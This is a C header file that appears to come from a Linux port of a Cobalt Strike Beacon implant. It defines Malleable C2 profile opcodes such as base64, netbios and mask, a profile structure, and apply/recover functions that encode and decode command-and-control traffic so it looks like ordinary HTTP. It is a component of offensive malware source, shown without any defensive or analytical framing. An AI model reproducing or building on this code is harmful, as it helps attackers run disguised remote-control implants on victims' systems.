#ifndef LINUX_BEACON_PROFILE_H
#define LINUX_BEACON_PROFILE_H

/* Official Malleable opcodes — CobaltStrikeBeaconCppSource-main/src/profile.cpp */
#define IN_APPEND          0x01
#define IN_PREPEND         0x02
#define IN_BASE64          0x03
#define IN_PRINT           0x04
#define IN_PARAMETER       0x05
#define IN_HEADER          0x06
#define IN_BUILD           0x07
#define IN_NETBIOS         0x08
#define IN_ADD_PARAMETER   0x09
#define IN_ADD_HEADER      0x0a
#define IN_NETBIOSU        0x0b
#define IN_URI_APPEND      0x0c
#define IN_BASE64URL       0x0d
#define IN_MASK            0x0f
#define IN_ADD_HEADER_HOST 0x10

typedef struct {
    char *headers;     /* "Name: value\r\n" concatenated */
    char *parameters;  /* "?a=b&c=d" including leading ? */
    char *uri;         /* path; may gain uri-append */
    char *buffer;      /* print() body */
    int   blen;
    int   max;
    char *temp;
    char *stage;
} profile_t;

void profile_setup(profile_t *p, int size);
void profile_free(profile_t *p);
/* program_len = setting_len(SETTING_C2_*) — do not use bare 1024 on heap copies */
void apply(char *program, int program_len, profile_t *p,
           char *arg1, int len1, char *arg2, int len2);
int  recover(char *program, int program_len, char *buffer, int read, int max);

#endif
